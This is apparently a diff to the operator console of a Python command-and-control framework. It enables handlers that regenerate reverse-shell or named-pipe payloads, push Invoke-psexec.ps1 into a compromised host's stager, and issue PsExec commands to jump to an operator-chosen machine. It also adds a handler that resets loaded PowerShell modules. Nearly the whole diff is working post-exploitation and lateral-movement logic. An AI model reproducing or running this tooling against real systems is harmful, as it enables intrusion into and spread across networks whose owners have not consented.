@@ -1332,33 +1332,38 @@ class mymainclass():
                     cmd_tag = self.__t_myconstant.TAG_PIPE_INTE_STAGER
                     continue
 
-                # if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_PSEXEC:
-                #     #re-generate payload 
-                #     t_mypayloadgen = payloadgen.mypayloadgen()
-                #     if self.__t_mypayload.payloadtype == "socket":
-                #         t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.host,self.__t_mypayload.port)
-                #     else:
-                #         t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.namepipehost,self.__t_mypayload.namepipe)
-                #     t_mypayloadgen.gen_ps1()
-                #     t_mypayloadgen.gen_psexec()
+                if command_id == self.__t_myconstant.CMD_PIPE_STAGER_TOOLS_PSEXEC:
+                    #re-generate payload 
+                    t_mypayloadgen = payloadgen.mypayloadgen()
+                    if self.__t_mypayload.payloadtype == "socket":
+                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.host,self.__t_mypayload.port)
+                    else:
+                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.namepipehost,self.__t_mypayload.namepipe)
+                    t_mypayloadgen.gen_ps1()
+                    t_mypayloadgen.gen_psexec()
 
-                #     #set auto compete to stager uuid
-                #     setautocomplete(self.__t_myserver.get_running_stager())
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_pipe_stager())
 
-                #     user_input_stager = input("Please enter the stager uuid: ")
-                #     if user_input_stager not in self.__t_myserver.get_running_stager():
-                #         print("Please input a valid stager uuid")
-                #         continue
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_pipe_stager():
+                        print("Please input a valid stager uuid")
+                        continue
 
-                #     t_psloader = ps_loader()
-                #     t_result = t_psloader.load_ps("Invoke-psexec.ps1")
-                #     self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                    if ("Invoke-psexec.ps1" not in self.__t_myserver.get_pipe_psloadlist(user_input_stager)):
+                        t_psloader = ps_loader()
+                        t_result = t_psloader.load_ps("Invoke-psexec.ps1")
+                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                        #update the list
+                        self.__t_myserver.add_pipe_psloadlist(user_input_stager,"Invoke-psexec.ps1")
+                    else:
+                        print("Invoke-psexec already loaded")
 
-                #     removecomplete()
-                #     user_input_target = input("Please enter hostname to jump to: ")
-                #     self.__t_myserver.create_command(user_input_stager,"ps","Invoke-psexec \"stop \\\\{}\"".format(user_input_target))
-                #     self.__t_myserver.create_command(user_input_stager,"ps","Invoke-psexec \"start \\\\{}\"".format(user_input_target))
-                #     continue
+                    removecomplete()
+                    user_input_target = input("Please enter hostname to jump to: ")
+                    self.__t_myserver.create_pipe_command(user_input_stager,"ps","Invoke-psexec \"stop \\\\{}\"".format(user_input_target))
+                    self.__t_myserver.create_pipe_command(user_input_stager,"ps","Invoke-psexec \"start \\\\{}\"".format(user_input_target))
+                    continue
 
                 if command_id == self.__t_myconstant.CMD_PIPE_STAGER_TOOLS_IF64BIT:
                     #set auto compete to stager uuid
@@ -1524,17 +1529,17 @@ class mymainclass():
                     
                     continue
 
-                # if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_PSRESET:
-                #     #set auto compete to stager uuid
-                #     setautocomplete(self.__t_myserver.get_running_pipe_stager())
+                if command_id == self.__t_myconstant.CMD_PIPE_STAGER_TOOLS_PSRESET:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_pipe_stager())
 
-                #     user_input_stager = input("Please enter the stager uuid: ")
-                #     if user_input_stager not in self.__t_myserver.get_running_pipe_stager():
-                #         print("Please input a valid stager uuid")
-                #         continue
-                #     self.__t_myserver.create_pipe_command(user_input_stager,"psreset","dummy")
-                #     self.__t_myserver.clean_psloadlist(user_input_stager)
-                #     continue
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_pipe_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+                    self.__t_myserver.create_pipe_command(user_input_stager,"psreset","dummy")
+                    self.__t_myserver.clean_pipe_psloadlist(user_input_stager)
+                    continue
                 
                 if command_id == self.__t_myconstant.CMD_PIPE_STAGER_TOOLS_INJECT:
                     
